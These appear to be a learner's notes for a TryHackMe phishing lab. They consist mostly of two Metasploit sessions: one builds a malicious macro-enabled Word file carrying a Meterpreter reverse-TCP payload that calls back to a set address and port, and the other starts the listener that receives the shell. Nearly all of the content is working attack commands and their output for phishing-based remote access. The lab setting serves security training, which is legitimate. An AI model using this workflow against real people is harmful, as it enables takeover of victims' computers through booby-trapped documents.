# Notes for Day10

## Theme: **Phishing**

## Links:

- [VirusTotal report](https://www.virustotal.com/gui/file/ab3f9303460c590c452f0c259a35d50a7a2e7c52a81d4e5a42bb98b365d8ab9b/behavior)
- [Phishing Room](https://tryhackme.com/module/phishing)

## General:

```bash
root@AttackBox:~# msfconsole 
[...]
Metasploit Documentation: https://docs.metasploit.com/

msf6 > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 > use exploit/multi/fileformat/office_word_macro
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/office_word_macro) > set LHOST 10.10.217.62
LHOST => 10.10.217.62
msf6 exploit(multi/fileformat/office_word_macro) > set LPORT 8888
LPORT => 8888
msf6 exploit(multi/fileformat/office_word_macro) > show options

Module options (exploit/multi/fileformat/office_word_macro):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
   FILENAME        msf.docm         yes       The Office document macro file (docm)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.217.62    yes       The listen address (an interface may be specified)
   LPORT     8888             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word on Windows


View the full module info with the info, or info -d command.

msf6 exploit(multi/fileformat/office_word_macro) > exploit

[*] Using template: /opt/metasploit-framework/embedded/framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: msf.docm
[+] msf.docm stored at /root/.msf4/local/msf.docm
msf6 exploit(multi/fileformat/office_word_macro) > exit
``` 

```bash
root@AttackBox:~# msfconsole 
[...]
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.217.62
LHOST => 10.10.217.62
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.217.62    yes       The listen address (an interface may be specified)
   LPORT     8888             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.217.62:8888
```